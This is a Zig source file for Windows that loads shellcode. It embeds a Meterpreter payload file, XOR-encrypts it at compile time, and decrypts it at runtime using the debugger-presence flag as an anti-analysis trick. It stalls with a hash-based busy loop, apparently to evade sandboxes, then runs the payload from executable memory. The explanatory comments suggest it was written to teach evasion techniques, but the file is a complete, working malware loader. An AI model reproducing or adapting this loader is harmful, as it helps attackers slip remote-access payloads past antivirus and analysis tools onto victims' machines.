const std = @import("std");
const hash = std.crypto.hash;
const win32 = @import("win32");

const VirtualAlloc = win32.system.memory.VirtualAlloc;

const VIRTUAL_ALLOCATION_TYPE = win32.system.memory.VIRTUAL_ALLOCATION_TYPE;
const PAGE_EXECUTE_READWRITE = win32.system.memory.PAGE_EXECUTE_READWRITE;

//encrypt is a function that takes a compile time known string, and returns it encrypted
fn encrypt(comptime string: []const u8, k: u8) [string.len]u8 {
    // Zig has a default compilation timeout
    // We override it  to a big number so that the whole encryption can happen
    @setEvalBranchQuota(100000000);
    var encrypted_string: [string.len]u8 = undefined;
    // This loops over all characters of string - chr, and idx is the index
    for (string, 0..) |chr, idx| {
        // We do not want to xor with a single value, so we use also the index
        const key: u8 = @truncate((idx * 83) % 256);
        encrypted_string[idx] = chr ^ key ^ k;
    }
    return encrypted_string;
}

// This is very similar to the encrypt function
fn decrypt(mem: []u8, s: []const u8, k: u8) void {
    for (s, 0..) |chr, idx| {
        const key: u8 = @truncate((idx * 83) % 256);
        // The one difference is that this function also calls shouldRun, which should return 0
        // shouldRun is a function that ensures this is evaluated during runtime
        // this is how we prevent Zig from optimizing decryption out
        mem[idx] = chr ^ key ^ k + shouldRun();
    }
}
fn comptimeObfuscation(comptime s: []const u8) [s.len]u8 {
    const key = 0x42;
    // We call encrypt at comptime
    const enc_str = comptime encrypt(s, key);
    var ret_array: [s.len]u8 = [_]u8{0} ** s.len;
    decrypt(&ret_array, &enc_str, key);

    return ret_array;
}

fn shouldRun() u8 {
    // The value of BeingDebugged is determined during runtime
    const peb = std.os.windows.peb();
    return peb.BeingDebugged;
}

pub fn main() !void {
    // We include the shellcode as a string at compile time, and encrypt it
    try sleep();
    const shellcode = comptimeObfuscation(@embedFile("meterpreter.bin"));
    const allocated_memory_ptr: [*]u8 = @ptrCast(VirtualAlloc(null, shellcode.len, VIRTUAL_ALLOCATION_TYPE{ .COMMIT = 1 }, PAGE_EXECUTE_READWRITE).?);
    @memcpy(allocated_memory_ptr, shellcode[0..]);
    const shellcode_fn: *const fn () void = @ptrCast(allocated_memory_ptr);
    shellcode_fn();
}

fn sleep() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    var allocator = gpa.allocator();
    defer _ = gpa.deinit();

    var decimal: usize = 1;
    while (true) : (decimal += 1) {
        const b = try std.fmt.allocPrint(allocator, "{s}{d}", .{ "Hello World!", decimal });
        defer allocator.free(b);

        var out: [hash.Md5.digest_length]u8 = undefined;
        hash.Md5.hash(b, &out, .{});

        const hex = try std.fmt.allocPrint(allocator, "{}", .{std.fmt.fmtSliceHexLower(&out)});
        defer allocator.free(hex);

        if (std.mem.eql(u8, hex[0..5], "00000")) {
            std.debug.print("{d}", .{decimal});
            break;
        }
    }
}
